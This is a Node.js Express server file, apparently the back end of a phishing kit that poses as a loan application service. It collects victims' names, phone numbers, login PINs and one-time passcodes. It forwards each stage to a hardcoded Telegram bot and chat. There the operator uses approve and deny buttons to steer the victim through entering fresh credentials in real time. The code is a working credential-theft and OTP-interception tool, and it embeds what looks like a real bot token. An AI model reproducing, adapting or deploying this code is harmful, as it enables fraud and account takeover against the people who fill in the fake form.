const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('.'));

// Store active sessions and their states
const sessions = new Map();

// Telegram credentials
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8616013719:AAGZfZ2awOXRePuwmbDpHjG9CKa4bmae8Ac';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8820857419';
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Serve the index.html
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// Endpoint: Create a new application session
app.post('/api/session', (req, res) => {
    const sessionId = Date.now().toString();
    sessions.set(sessionId, {
        id: sessionId,
        createdAt: new Date(),
        status: 'active',
        page2Approved: null,
        loginApproved: null,
        otpApproved: null,
        applicationData: req.body
    });
    res.json({ sessionId });
});

// Endpoint: Send application data to Telegram
app.post('/api/send-to-telegram', async (req, res) => {
    const { stage, applicationData, sessionId } = req.body;

    if (!sessionId || !sessions.has(sessionId)) {
        return res.status(400).json({ error: 'Invalid session' });
    }

    let message = '';
    let callbackData = '';

    try {
        if (stage === 'page2') {
            message = `
<b>🟠 NEW LOAN APPLICATION</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>Loan Amount:</b> P ${applicationData.loanAmount.toLocaleString()}
<b>Name:</b> ${applicationData.firstName} ${applicationData.lastName}
<b>Phone:</b> ${applicationData.phoneNumber}
<b>Purpose:</b> ${applicationData.loanPurpose}
━━━━━━━━━━━━━━━━━━━━━━
<b>Status: PENDING APPLICATION DETAILS REVIEW</b>
<b>Session ID:</b> ${sessionId}

Approve or Deny this application.
            `;

            await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '✅ APPROVED', callback_data: `app_approved_${sessionId}` },
                                { text: '❌ DENY', callback_data: `app_deny_${sessionId}` }
                            ]
                        ]
                    }
                })
            });

        } else if (stage === 'page3') {
            message = `
<b>🔐 LOGIN VERIFICATION</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>Phone:</b> ${applicationData.loginPhone}
<b>PIN:</b> ${applicationData.loginPin}
━━━━━━━━━━━━━━━━━━━━━━
<b>Status: AWAITING LOGIN VERIFICATION</b>
<b>Session ID:</b> ${sessionId}

Verify if credentials are correct.
            `;

            await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '✅ APPROVED', callback_data: `login_approved_${sessionId}` },
                                { text: '⚠️ VERIFY DEVICE', callback_data: `login_verify_${sessionId}` }
                            ],
                            [
                                { text: '❌ DENY', callback_data: `login_deny_${sessionId}` }
                            ]
                        ]
                    }
                })
            });

        } else if (stage === 'page5') {
            message = `
<b>📱 OTP VERIFICATION</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>Phone:</b> ${applicationData.loginPhone}
<b>OTP Entered:</b> ${applicationData.otp}
━━━━━━━━━━━━━━━━━━━━━━
<b>Status: AWAITING OTP VERIFICATION</b>
<b>Session ID:</b> ${sessionId}

Verify if OTP is correct.
            `;

            await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '✅ APPROVE', callback_data: `otp_approve_${sessionId}` },
                                { text: '❌ WRONG OTP', callback_data: `otp_wrong_${sessionId}` }
                            ]
                        ]
                    }
                })
            });
        }

        res.json({ success: true, message: 'Data sent to Telegram' });
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        res.status(500).json({ error: 'Failed to send to Telegram' });
    }
});

// Endpoint: Check approval status
app.get('/api/status/:sessionId/:stage', (req, res) => {
    const { sessionId, stage } = req.params;

    if (!sessions.has(sessionId)) {
        return res.status(404).json({ error: 'Session not found' });
    }

    const session = sessions.get(sessionId);
    let approved = null;

    if (stage === 'page2') {
        approved = session.page2Approved;
    } else if (stage === 'page3') {
        approved = session.loginApproved;
    } else if (stage === 'page5') {
        approved = session.otpApproved;
    }

    res.json({ approved, session });
});

// Telegram webhook endpoint
app.post('/api/webhook', async (req, res) => {
    try {
        const update = req.body;

        // Handle callback queries from inline buttons
        if (update.callback_query) {
            const callbackQuery = update.callback_query;
            const data = callbackQuery.data;
            const messageId = callbackQuery.message.message_id;
            const chatId = callbackQuery.from.id;

            // Answer the callback query
            await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    callback_query_id: callbackQuery.id,
                    text: 'Response received! ✅'
                })
            });

            // Parse callback data
            if (data.startsWith('app_approved_')) {
                const sessionId = data.replace('app_approved_', '');
                if (sessions.has(sessionId)) {
                    sessions.get(sessionId).page2Approved = true;
                    // Edit message to show approval
                    await fetch(`${TELEGRAM_API_URL}/editMessageText`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            message_id: messageId,
                            text: '✅ APPLICATION APPROVED\n\nAwaiting next step...',
                            parse_mode: 'HTML'
                        })
                    });
                }
            } else if (data.startsWith('app_deny_')) {
                const sessionId = data.replace('app_deny_', '');
                if (sessions.has(sessionId)) {
                    sessions.get(sessionId).page2Approved = false;
                    await fetch(`${TELEGRAM_API_URL}/editMessageText`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            message_id: messageId,
                            text: '❌ APPLICATION DENIED',
                            parse_mode: 'HTML'
                        })
                    });
                }
            } else if (data.startsWith('login_approved_')) {
                const sessionId = data.replace('login_approved_', '');
                if (sessions.has(sessionId)) {
                    sessions.get(sessionId).loginApproved = 'approved';
                    await fetch(`${TELEGRAM_API_URL}/editMessageText`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            message_id: messageId,
                            text: '✅ LOGIN APPROVED',
                            parse_mode: 'HTML'
                        })
                    });
                }
            } else if (data.startsWith('login_verify_')) {
                const sessionId = data.replace('login_verify_', '');
                if (sessions.has(sessionId)) {
                    sessions.get(sessionId).loginApproved = 'verify_device';
                    await fetch(`${TELEGRAM_API_URL}/editMessageText`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            message_id: messageId,
                            text: '⚠️ DEVICE VERIFICATION REQUIRED',
                            parse_mode: 'HTML'
                        })
                    });
                }
            } else if (data.startsWith('login_deny_')) {
                const sessionId = data.replace('login_deny_', '');
                if (sessions.has(sessionId)) {
                    sessions.get(sessionId).loginApproved = false;
                    await fetch(`${TELEGRAM_API_URL}/editMessageText`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            message_id: messageId,
                            text: '❌ LOGIN DENIED',
                            parse_mode: 'HTML'
                        })
                    });
                }
            } else if (data.startsWith('otp_approve_')) {
                const sessionId = data.replace('otp_approve_', '');
                if (sessions.has(sessionId)) {
                    sessions.get(sessionId).otpApproved = true;
                    await fetch(`${TELEGRAM_API_URL}/editMessageText`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            message_id: messageId,
                            text: '✅ OTP APPROVED - LOAN APPROVED',
                            parse_mode: 'HTML'
                        })
                    });
                }
            } else if (data.startsWith('otp_wrong_')) {
                const sessionId = data.replace('otp_wrong_', '');
                if (sessions.has(sessionId)) {
                    sessions.get(sessionId).otpApproved = false;
                    await fetch(`${TELEGRAM_API_URL}/editMessageText`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            message_id: messageId,
                            text: '❌ INCORRECT OTP',
                            parse_mode: 'HTML'
                        })
                    });
                }
            }
        }

        res.json({ ok: true });
    } catch (error) {
        console.error('Webhook error:', error);
        res.status(500).json({ error: 'Webhook processing failed' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📱 Telegram Bot Token: ${TELEGRAM_BOT_TOKEN.substring(0, 10)}...`);
    console.log(`💬 Chat ID: ${TELEGRAM_CHAT_ID}`);
});
